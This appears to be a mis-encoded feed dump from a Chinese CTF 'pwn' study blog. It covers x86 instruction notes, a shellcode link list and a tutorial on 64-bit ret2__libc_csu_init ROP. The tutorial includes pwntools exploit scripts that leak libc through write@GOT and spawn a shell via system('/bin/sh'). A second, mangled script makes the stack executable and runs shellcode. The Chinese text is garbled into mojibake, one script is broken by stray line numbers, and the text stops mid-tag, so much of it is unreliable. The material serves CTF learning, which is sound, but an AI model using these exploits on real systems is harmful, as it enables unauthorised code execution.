3&gt;å¾ªç¯æ§åˆ¶æŒ‡ä»¤(çŸ­è½¬ç§»)      LOOP            CXä¸ä¸ºé›¶æ—¶å¾ªç¯.      LOOPE&#x2F;LOOPZ    CXä¸ä¸ºé›¶ä¸”æ ‡å¿—Z&#x3D;1æ—¶å¾ªç¯.      LOOPNE&#x2F;LOOPNZ  CXä¸ä¸ºé›¶ä¸”æ ‡å¿—Z&#x3D;0æ—¶å¾ªç¯.      JCXZ            CXä¸ºé›¶æ—¶è½¬ç§».      JECXZ          ECXä¸ºé›¶æ—¶è½¬ç§».  4&gt;ä¸­æ–­æŒ‡ä»¤      INT    ä¸­æ–­æŒ‡ä»¤      INTO    æº¢å‡ºä¸­æ–­      IRET    ä¸­æ–­è¿”å›  5&gt;å¤„ç†å™¨æ§åˆ¶æŒ‡ä»¤      HLT    å¤„ç†å™¨æš‚åœ, ç›´åˆ°å‡ºç°ä¸­æ–­æˆ–å¤ä½ä¿¡å·æ‰ç»§ç»­.      WAIT    å½“èŠ¯ç‰‡å¼•çº¿TESTä¸ºé«˜ç”µå¹³æ—¶ä½¿CPUè¿›å…¥ç­‰å¾…çŠ¶æ€.      ESC    è½¬æ¢åˆ°å¤–å¤„ç†å™¨.      LOCK    å°é”æ€»çº¿.      NOP    ç©ºæ“ä½œ.      STC    ç½®è¿›ä½æ ‡å¿—ä½.      CLC    æ¸…è¿›ä½æ ‡å¿—ä½.      CMC    è¿›ä½æ ‡å¿—å–å.      STD    ç½®æ–¹å‘æ ‡å¿—ä½.      CLD    æ¸…æ–¹å‘æ ‡å¿—ä½.      STI    ç½®ä¸­æ–­å…è®¸ä½.      CLI    æ¸…ä¸­æ–­å…è®¸ä½.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…­ã€ä¼ªæŒ‡ä»¤"><a href="#å…­ã€ä¼ªæŒ‡ä»¤" class="headerlink" title="å…­ã€ä¼ªæŒ‡ä»¤"></a>å…­ã€ä¼ªæŒ‡ä»¤</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">ã€€ã€€DW      å®šä¹‰å­—(2å­—èŠ‚).  PROC    å®šä¹‰è¿‡ç¨‹.  ENDP    è¿‡ç¨‹ç»“æŸ.  SEGMENT å®šä¹‰æ®µ.  ASSUME  å»ºç«‹æ®µå¯„å­˜å™¨å¯»å€.  ENDS    æ®µç»“æŸ.  END    ç¨‹åºç»“æŸ.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Art_of_shellcode</title>
      <link href="/2025/02/22/Art-of-shellcode/"/>
      <url>/2025/02/22/Art-of-shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾ˆæœ‰ç”¨çš„ç½‘å€"><a href="#å¾ˆæœ‰ç”¨çš„ç½‘å€" class="headerlink" title="å¾ˆæœ‰ç”¨çš„ç½‘å€"></a>å¾ˆæœ‰ç”¨çš„ç½‘å€</h2><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a></p><p><a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">https://v3rdant.cn/Pwn.The-Art-of-Shellcode/</a></p><p><a href="https://blog.csdn.net/weixin_59166557/article/details/143896997">PWN:æ‰‹åŠ¨ç¼–å†™ x64 åŸºäºsyscall çš„ shell code(TODO)_x64 syscall pwn-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›é˜¶ROP</title>
      <link href="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/"/>
      <url>/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›é˜¶ROP"><a href="#è¿›é˜¶ROP" class="headerlink" title="è¿›é˜¶ROP"></a><strong>è¿›é˜¶ROP</strong></h1><h2 id="ret2-libc-csu-init-64ä½ELF"><a href="#ret2-libc-csu-init-64ä½ELF" class="headerlink" title="ret2__libc_csu_init(64ä½ELF)"></a><strong>ret2__libc_csu_init(64ä½ELF)</strong></h2><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨64ä½ç¨‹åºä¸­ï¼Œ<strong>å‡½æ•°çš„å‰6ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„</strong>ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨x64ä¸‹çš„__libc_scu_initä¸­çš„gadgetsã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹libcè¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><p><code>libc_csu_init</code>åˆ©ç”¨æ–¹æ³•ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:00000000004005C0 ; void _libc_csu_init(void).text:00000000004005C0                 public __libc_csu_init.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o.text:00000000004005C0 ; __unwind &#123;.text:00000000004005C0                 push    r15.text:00000000004005C2                 push    r14.text:00000000004005C4                 mov     r15d, edi.text:00000000004005C7                 push    r13.text:00000000004005C9                 push    r12.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry.text:00000000004005D2                 push    rbp.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004005DA                 push    rbx.text:00000000004005DB                 mov     r14, rsi.text:00000000004005DE                 mov     r13, rdx.text:00000000004005E1                 sub     rbp, r12.text:00000000004005E4                 sub     rsp, 8.text:00000000004005E8                 sar     rbp, 3.text:00000000004005EC                 call    _init_proc.text:00000000004005F1                 test    rbp, rbp.text:00000000004005F4                 jz      short loc_400616.text:00000000004005F6                 xor     ebx, ebx.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h].text:0000000000400600.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54â†“j.text:0000000000400600                 mov     rdx, r13.text:0000000000400603                 mov     rsi, r14.text:0000000000400606                 mov     edi, r15d.text:0000000000400609                 call    qword ptr [r12+rbx*8].text:000000000040060D                 add     rbx, 1.text:0000000000400611                 cmp     rbx, rbp.text:0000000000400614                 jnz     short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34â†‘j.text:0000000000400616                 add     rsp, 8.text:000000000040061A                 pop     rbx.text:000000000040061B                 pop     rbp.text:000000000040061C                 pop     r12.text:000000000040061E                 pop     r13.text:0000000000400620                 pop     r14.text:0000000000400622                 pop     r15.text:0000000000400624                 retn.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0.text:0000000000400624 __libc_csu_init endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><ol><li>ä»0x000000000040061Aä¸€ç›´åˆ°ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åˆ©ç”¨æ ˆæº¢å‡ºæ„é€ æ ˆä¸Šæ•°æ®æ¥æ§åˆ¶rbx,rbp,r12,r13,r14,r15å¯„å­˜å™¨çš„æ•°æ®</strong>ã€‚<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:000000000040061A                 pop     rbx.text:000000000040061B                 pop     rbp.text:000000000040061C                 pop     r12.text:000000000040061E                 pop     r13.text:0000000000400620                 pop     r14.text:0000000000400622                 pop     r15.text:0000000000400624                 retn.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0.text:0000000000400624 __libc_csu_init endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>ä»0x0000000000400600åˆ°0x0000000000400609ï¼Œæˆ‘ä»¬å¯ä»¥å°†r13èµ‹ç»™rdx,å°†r14èµ‹ç»™rsiï¼Œå°†r15dèµ‹ç»™ediï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶è¿™é‡Œèµ‹ç»™çš„æ˜¯ediï¼Œ<strong>ä½†å…¶å®æ­¤æ—¶rdiçš„é«˜32ä½å¯„å­˜å™¨å€¼ä¸º0</strong>ï¼Œ<strong>æ‰€ä»¥å…¶å®æˆ‘ä»¬å¯ä»¥æ§åˆ¶rdiå¯„å­˜å™¨çš„å€¼ï¼Œåªä¸è¿‡åªèƒ½æ§åˆ¶ä½32ä½ï¼‰ï¼Œè€Œè¿™ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œä¹Ÿæ˜¯x64å‡½æ•°è°ƒç”¨ä¸­ä¼ é€’çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨ã€‚æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åˆç†åœ°æ§åˆ¶r12ä¸rbxï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°</strong>ã€‚<em>æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶rbxä¸º0ï¼Œr12ä¸ºå­˜å‚¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€</em>ã€‚<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54â†“j.text:0000000000400600                 mov     rdx, r13.text:0000000000400603                 mov     rsi, r14.text:0000000000400606                 mov     edi, r15d.text:0000000000400609                 call    qword ptr [r12+rbx*8]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>ä»0x000000000040060Dåˆ°0x0000000000400614ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶rbxä¸rbpçš„ä¹‹é—´çš„å…³ç³»ä¸ºrbx+1=rbpï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šæ‰§è¡Œloc_400600ï¼Œè¿›è€Œå¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹é¢çš„æ±‡ç¼–ç¨‹åºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„è®¾ç½®rbx=0ï¼Œrbp=1ã€‚<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:000000000040060D                 add     rbx, 1.text:0000000000400611                 cmp     rbx, rbp.text:0000000000400614                 jnz     short loc_400600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5 at master Â· ctf-wiki/ctf-challenges</a><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128110231.png" alt="Pasted image 20250128110231"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111234.png" alt="Pasted image 20250128111234"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111505.png" alt="Pasted image 20250128111505"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111308.png" alt="Pasted image 20250128111308"><br>idaçœ‹/cyclicæµ‹å‡ºæ ˆåç§»ä¸º<code>0x88=136</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p &#x3D; process(&#39;.&#x2F;level5&#39;)elf &#x3D; ELF(&#39;level5&#39;)libc &#x3D; ELF(&#39;libc.so.6&#39;)pop_addr &#x3D; 0x40061awrite_got &#x3D; elf.got[&#39;write&#39;]mov_addr &#x3D; 0x400600main_addr &#x3D; elf.symbols[&#39;main&#39;]p.recvuntil(&#39;Hello, World\n&#39;)playload &#x3D; &#39;A&#39;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + &#39;a&#39;*(0x8+8*6) + p64(main_addr)p.sendline(playload)write_start &#x3D; u64(p.recv(8))print hex(write_start)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payloadè§£é‡Šï¼š<br>é¦–å…ˆè¾“å…¥136ä¸ªå­—ç¬¦ä½¿ç¨‹åºå‘ç”Ÿæ ˆæº¢å‡ºï¼Œç„¶åè®©pop_addrè¦†ç›–æ ˆä¸­çš„è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºæ‰§è¡Œpop_addråœ°å€å¤„çš„å‡½æ•°ï¼Œå¹¶åˆ†åˆ«å°†æ ˆä¸­çš„0ã€1ã€write_gotå‡½æ•°åœ°å€ã€8ã€write_gotã€1åˆ†åˆ«popåˆ°å¯„å­˜å™¨rbxã€rbpã€r12ã€r13ã€r14ã€r15ä¸­å»ï¼Œä¹‹åå°†popå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–mov_addrçš„åœ°å€ä¸ºï¼Œå¦‚ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:000000000040061A                 pop     rbx &#x2F;&#x2F;rbx-&gt; 0.text:000000000040061B                 pop     rbp &#x2F;&#x2F;rbp-&gt; 1.text:000000000040061C                 pop     r12 &#x2F;&#x2F;r12-&gt; write_gotå‡½æ•°åœ°å€.text:000000000040061E                 pop     r13 &#x2F;&#x2F;r13-&gt; 8.text:0000000000400620                 pop     r14 &#x2F;&#x2F;r14-&gt; write_gotå‡½æ•°åœ°å€.text:0000000000400622                 pop     r15 &#x2F;&#x2F;r15-&gt; 1.text:0000000000400624                 retn        &#x2F;&#x2F;è¦†ç›–ä¸ºmov_addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>ä¸¤ä¸ªwrite_gotå‡½æ•°ä½œç”¨:<br>å†å¸ƒç½®å®Œå¯„å­˜å™¨åï¼Œç”±äºæœ‰<code>call qword ptr[r12+rbx*8]</code>å®ƒè°ƒç”¨äº†writeå‡½æ•°ï¼Œå…¶å‚æ•°ä¸º<code>write_got</code>å‡½æ•°åœ°å€ï¼Œå†™æˆCè¯­è¨€ç±»ä¼¼äºï¼š<code>write(write_gotå‡½æ•°åœ°å€)==printfï¼ˆwrite_gotå‡½æ•°åœ°å€)</code>ï¼Œå†ä½¿ç”¨<code>u64(p.recv(8)</code>æ¥å—æ•°æ®å¹¶printå‡ºæ¥å°±è¡Œäº†<br>ä¹‹åç¨‹åºè½¬å‘mov_addrå‡½æ•°ï¼Œåˆ©ç”¨movæŒ‡ä»¤å¸ƒç½®å¯„å­˜å™¨rdxï¼Œrsiï¼Œedi<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:0000000000400600                 mov     rdx, r13 &#x2F;&#x2F;rdx&#x3D;r13&#x3D;&#x3D;8.text:0000000000400603                 mov     rsi, r14 &#x2F;&#x2F;rsi&#x3D;&#x3D;r14&#x3D;&#x3D;write_gotå‡½æ•°åœ°å€.text:0000000000400606                 mov     edi, r15d&#x2F;&#x2F;edi&#x3D;&#x3D;r15d&#x3D;&#x3D;1.text:0000000000400609                 call    qword ptr [r12+rbx*8] &#x2F;&#x2F;call write_gotå‡½æ•°åœ°å€.text:000000000040060D                 add     rbx, 1 .text:0000000000400611                 cmp     rbx, rbp &#x2F;&#x2F;rbx&#x3D;&#x3D;1,rbp&#x3D;&#x3D;1.text:0000000000400614                 jnz     short loc_400600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>JNZ(æˆ–JNE)(jump if not zero, or not equal)ï¼Œæ±‡ç¼–è¯­è¨€ä¸­çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤ã€‚ç»“æœä¸ä¸ºé›¶(æˆ–ä¸ç›¸ç­‰)åˆ™è½¬ç§»</p></blockquote><p>è¿™é‡Œrbxå’Œrbpéƒ½ç­‰äº1ï¼Œä»–ä»¬ç›¸ç­‰ï¼Œæ‰€ä»¥ç»§ç»­æ‰§è¡Œpayloadä»£ç (main_addr)ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œloc_400600</p><blockquote><p>ä»æ•´ä½“ä¸Šæ¥çœ‹ï¼Œæˆ‘ä»¬è¾“å…¥äº†<code>&#39;A&#39;*136</code>ï¼Œåˆ©ç”¨payloadå¯¹å¯„å­˜å™¨å¸ƒå±€ä¹‹ååˆé‡æ–°å›åˆ°äº†mainå‡½æ•°ï¼Œå†è¯´è¯´<code>&#39;a&#39;*(0x8+8*6)</code>çš„ä½œç”¨ï¼šå®ƒçš„ä½œç”¨å°±æ˜¯ä¸ºäº†<strong>å¹³è¡¡å †æ ˆ</strong><br>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“mov_addræ‰§è¡Œå®Œä¹‹åï¼ŒæŒ‰ç…§æµç¨‹ä»ç„¶ä¼šæ‰§è¡Œåœ°å€400616å¤„çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¹¶ä¸å¸Œæœ›å®ƒæ‰§è¡Œåˆ°è¿™ä¸ªå‡½æ•°ï¼ˆå› ä¸ºä»–ä¼šå†æ¬¡popå¯„å­˜å™¨æ›´æ¢æˆ‘ä»¬å¸ƒç½®å¥½çš„å†…å®¹ï¼‰ï¼Œæ‰€ä»¥ä¸ºäº†å †æ ˆå¹³è¡¡ï¼Œæˆ‘ä»¬ä½¿ç”¨åƒåœ¾æ•°æ®å¡«å……æ­¤å¤„çš„ä»£ç ï¼ˆ<strong>æ ˆåŒºå’Œä»£ç åŒºåŒå±äºå†…å­˜åŒºåŸŸï¼Œå¯ä»¥è¢«å¡«å……</strong>ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128132334.png" alt="Pasted image 20250128132334"><br>ç”¨åƒåœ¾æ•°æ®å¡«å……åœ°å€0x16-0x22çš„å†…å®¹ï¼Œæœ€åå°†main_addrè¦†ç›–retï¼Œä»è€Œæ‰§è¡Œmain_addrå¤„çš„å†…å®¹</p></blockquote><p>ç”±æ­¤æˆ‘ä»¬è·å¾—äº†writeçš„çœŸå®åœ°å€</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc&#x3D;ELF(&#39;&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6)libc_base&#x3D;write_start-libc.symbols[&#39;write&#39;]system_addr&#x3D;libc.symbols[&#39;system&#39;]+libc_basebinsh&#x3D;next(libc.search(&#39;&#x2F;bin&#x2F;sh&#39;))+libc_basepop_rdi_ret&#x3D;0x400623payload&#x3D;&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)p.send(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬è·å¾—writeå‡½æ•°çš„çœŸå®åœ°å€ä¹‹åï¼Œå°±å¯ä»¥è®¡ç®—å‡ºlibcæ–‡ä»¶çš„åŸºå€ï¼Œä»è€Œå¯ä»¥è®¡ç®—å‡ºsystemå‡½æ•°<br>å’Œ/bin/shå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä»è€Œåˆ©ç”¨å®ƒã€‚<br>æ¥ä¸‹æ¥è§£é‡Šä¸€ä¸‹ç¬¬äºŒä¸ªpayloadçš„æ„æ€ï¼š<br><code>payload=&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</code><br>å½“ç¨‹åºé‡æ–°æ‰§è¡Œåˆ°mainå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè®©è¿”å›åœ°å€è¢«pop_rdi_retè¦†ç›–ï¼Œä»è€Œç¨‹åºæ‰§è¡Œpop_rdi_retã€‚</p><blockquote><p>æ³¨æ„ï¼Œå½“æˆ‘ä»¬send payloadä¹‹åï¼Œpop_rdi_retã€binshå’Œsystem_addrè¢«é€åˆ°äº†æ ˆä¸­ï¼Œåˆ©ç”¨gadgets:pop rdi;retå°†æ ˆä¸­çš„binshåœ°å€é€å¾€rdiå¯„å­˜å™¨ä¸­ï¼ˆä¹Ÿå°±æ˜¯è¯´pop_rdi_retçš„å‚æ•°æ˜¯åœ°å€binsh)ï¼Œç„¶åå°†systemå‡½æ•°åœ°å€è¦†ç›–åˆ°retï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œæ­¤systemå‡½æ•°ã€‚<br><strong>å½“systemå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ä¼šåˆ©ç”¨åˆ°rdié‡Œçš„å‚æ•°</strong></p></blockquote><h3 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">def csu(rbx, rbp, r12, r13, r14, r15, last):    # pop rbx,rbp,r12,r13,r14,r15    # rbx should be 0,    # rbp should be 1,enable not to jump    # r12 should be the function we want to call    # rdi&#x3D;edi&#x3D;r15d    # rsi&#x3D;r14    # rdx&#x3D;r13    # fakeebp&#x3D;&#39;b&#39; * 8    payload &#x3D; &#39;a&#39; * 0x80 + fakeebp    payload +&#x3D; p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload +&#x3D; p64(csu_front_addr)    payload +&#x3D; &#39;a&#39; * 0x38    payload +&#x3D; p64(last)    sh.send(payload)    sleep(1)sh.recvuntil(&#39;Hello, World\n&#39;)## RDI, RSI, RDX, RCX, R8, R9, more on the stack## write(1,write_got,8)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr &#x3D; u64(sh.recv(8))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ‚è®°"><a href="#æ‚è®°" class="headerlink" title="æ‚è®°"></a>æ‚è®°</h3><p><code>pop_rdi_ret=0x400623</code><br><em>è¿™ä¸ªæ˜¯æ€ä¹ˆæ¥çš„ï¼Ÿidaé‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ï¼Ÿ</em><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140952.png" alt="Pasted image 20250128140952"></p><h4 id="1-ROPgadget"><a href="#1-ROPgadget" class="headerlink" title="1.ROPgadget"></a>1.ROPgadget</h4><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140914.png" alt="Pasted image 20250128140914"></p><h4 id="2-çœ‹æœºå™¨ç "><a href="#2-çœ‹æœºå™¨ç " class="headerlink" title="2.çœ‹æœºå™¨ç "></a>2.çœ‹æœºå™¨ç </h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">pop rbx---------&gt;5Bpop rbp---------&gt;5Dpop r12----------&gt;41 5Cpop r13----------&gt;41 5Dpop r14----------&gt;41 5Epop r15----------&gt;41 5F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>xxxxxxxxxx28 1from pwn import <em>2context(os=â€™linuxâ€™, arch=â€™amd64â€™, log_level=â€™debugâ€™)3â€‹4io = process(â€˜./pwn2â€™)5elf = ELF(â€˜./pwn2â€™)6â€‹7vul = 0x4009E78write = 0x4009DD9â€‹10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315â€‹16payload  = â€œAâ€</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[â€˜<strong>stack_protâ€™]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[â€˜</strong>libc_stack_endâ€™]) + p64(elf.sym[â€˜_dl_make_stack_executableâ€™])19payload += p64(vul)20â€‹21io.sendlineafter(â€˜welcome~\nâ€™, payload)22â€‹23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, â€œAâ€) + p64(jmp_rsi)25â€‹26io.sendline(payload)27â€‹28io.interactive()python</p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>ret2regï¼Œå³è¿”å›åˆ°å¯„å­˜å™¨åœ°å€è¿›è¡Œæ”»å‡»ï¼Œå¯ä»¥ç»•è¿‡åœ°å€æ··æ·†ï¼ˆASLRï¼‰ã€‚<br>ä¸€èˆ¬ç”¨äºå¼€å¯ASLRçš„ret2shellcodeé¢˜å‹ï¼Œåœ¨å‡½æ•°æ‰§è¡Œåï¼Œä¼ å…¥çš„å‚æ•°åœ¨æ ˆä¸­ä¼ ç»™æŸå¯„å­˜å™¨ï¼Œç„¶è€Œè¯¥å‡½æ•°åœ¨ç»“æŸå‰å¹¶æœªå°†è¯¥å¯„å­˜å™¨å¤ä½ï¼Œå°±å¯¼è‡´è¿™ä¸ªå¯„å­˜å™¨ä»è¿˜ä¿å­˜ç€å‚æ•°ï¼Œå½“è¿™ä¸ªå‚æ•°æ˜¯shellcodeæ—¶ï¼Œåªè¦ç¨‹åºä¸­å­˜åœ¨jmp/call regä»£ç ç‰‡æ®µæ—¶ï¼Œå³å¯é€šè¿‡gadgetè·³è½¬è‡³è¯¥å¯„å­˜å™¨æ‰§è¡Œshellcodeã€‚<br>è¯¥æ”»å‡»æ–¹æ³•ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºå‡½æ•°å†…éƒ¨å®ç°æ—¶ï¼Œæº¢å‡ºçš„ç¼“å†²åŒºåœ°å€é€šå¸¸ä¼šåŠ è½½åˆ°æŸä¸ªå¯„å­˜å™¨ä¸Šï¼Œåœ¨åæ¥çš„è¿è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šä¿®æ”¹ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><ul><li>æŸ¥çœ‹æ ˆæº¢å‡ºè¿”å›æ—¶å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘ç¼“å†²åŒºç©ºé—´ã€‚</li><li>æŸ¥æ‰¾å¯¹åº”çš„call å¯„å­˜å™¨æˆ–è€…jmp å¯„å­˜å™¨æŒ‡ä»¤ï¼Œå°†EIPè®¾ç½®ä¸ºè¯¥æŒ‡ä»¤åœ°å€ã€‚</li><li>å°†å¯„å­˜å™¨æ‰€æŒ‡å‘çš„ç©ºé—´ä¸Šæ³¨å…¥shellcodeï¼ˆç¡®ä¿è¯¥ç©ºé—´æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œé€šå¸¸æ˜¯æ ˆä¸Šçš„ï¼‰<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" 